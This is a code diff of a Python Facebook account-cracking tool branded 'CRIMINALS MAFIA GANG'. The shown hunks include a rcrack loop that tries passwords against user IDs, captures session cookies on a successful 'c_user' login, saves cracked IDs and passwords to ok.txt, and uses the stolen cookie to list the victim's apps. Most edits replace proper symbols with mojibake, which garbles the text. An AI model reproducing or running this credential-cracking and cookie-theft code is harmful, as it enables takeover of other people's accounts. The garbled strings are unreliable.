@@ -22,18 +22,18 @@ import string
 try:
     import requests
 except ImportError:
-    print('\n [✓] installing requests !...\n')
+    print('\n [âœ“] installing requests !...\n')
     os.system('pip install requests')
 
 try:
     import concurrent.futures
 except ImportError:
-    print('\n [✓] installing futures !...\n')
+    print('\n [âœ“] installing futures !...\n')
     os.system('pip install futures')
 try:
     import bs4
 except ImportError:
-    print('\n [✓] installing bs4 !...\n')
+    print('\n [âœ“] installing bs4 !...\n')
     os.system('pip install bs4')
 
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
@@ -120,15 +120,15 @@ logo ="""
 \033[1;37mY88b  d88P d8b 888   "   888 d8b Y88b  d88P \033[1;31mR
  \033[1;37m"Y8888P"  Y8P 888       888 Y8P  "Y8888P88 \033[1;31mE
                                                     
-\033[1;93m▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲
-\033[1;37m[✫] TEAM      [✫]\033[1;36m  CRIMINALS MAFIA GANG
-\033[1;37m[✫] MAKER     [✫]\033[1;35m   SHAMROZ-KING-BRAND
-\033[1;37m[✫] FACEBOOK  [✫]\033[1;35m    SHAMROZ TRICKER
-\033[1;37m[✫] GITHUB    [✫]\033[1;35m    SH4MR0Z-TR1CK3R
-\033[1;37m[✫] VERSION   [✫]\033[1;32m      (0.1) TRIAL
-\033[1;37m[✫] STATUS    [✫]\033[1;32m      ALWAYS-FREE
-               👉😈 \033[1;31mHATERS MAKE ME FAMOUS 😃💙
-\033[1;93m▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼
+\033[1;93mâ–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²
+\033[1;37m[âœ«] TEAM      [âœ«]\033[1;36m  CRIMINALS MAFIA GANG
+\033[1;37m[âœ«] MAKER     [âœ«]\033[1;35m   SHAMROZ-KING-BRAND
+\033[1;37m[âœ«] FACEBOOK  [âœ«]\033[1;35m    SHAMROZ TRICKER
+\033[1;37m[âœ«] GITHUB    [âœ«]\033[1;35m    SH4MR0Z-TR1CK3R
+\033[1;37m[âœ«] VERSION   [âœ«]\033[1;32m      (0.1) TRIAL
+\033[1;37m[âœ«] STATUS    [âœ«]\033[1;32m      ALWAYS-FREE
+               ðŸ‘‰ðŸ˜ˆ \033[1;31mHATERS MAKE ME FAMOUS ðŸ˜ƒðŸ’™
+\033[1;93mâ–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼
 
 '\33[1;97mTURN on & off (ARPLANE MODE) before use'   
 \033[1;97m=================================================="""
@@ -144,7 +144,7 @@ def main():
   try: 
     httpCaht = requests.get("https://github.com/Nil500/Approval.txt/blob/main/Approval.txt").text 
     if id in httpCaht: 
-      print("\033[92m  YOUR KEY IS ACTIVE AGAIN RUN THISH TOOLS˜˜........\033[97m")
+      print("\033[92m  YOUR KEY IS ACTIVE AGAIN RUN THISH TOOLSËœËœ........\033[97m")
       msg = str(os.geteuid()) 
       time.sleep(3) 
       pass 
@@ -172,7 +172,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
     else:
-        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))
+        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))
         for i in range(len(game)):
             print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
@@ -228,7 +228,7 @@ def random_pak_jsjnumber():
 			pwx = [guru,bilal]
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(47*"-")
-	print('[✓] Crack process has been completed')
+	print('[âœ“] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
 	print(47*"-")
 	print(' Press Inter To Back Menu')
@@ -283,9 +283,9 @@ def rcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
-				print('\33[1;92m[SHAMROZ-OK] '+cid+' | '+ps+'\33[0;97m')
+				print('\33[1;92m[SHAMROZ-OK] '+uid+' | '+ps+'\33[0;97m')
 				cek_apk(session,coki)
-				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
+				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			else:
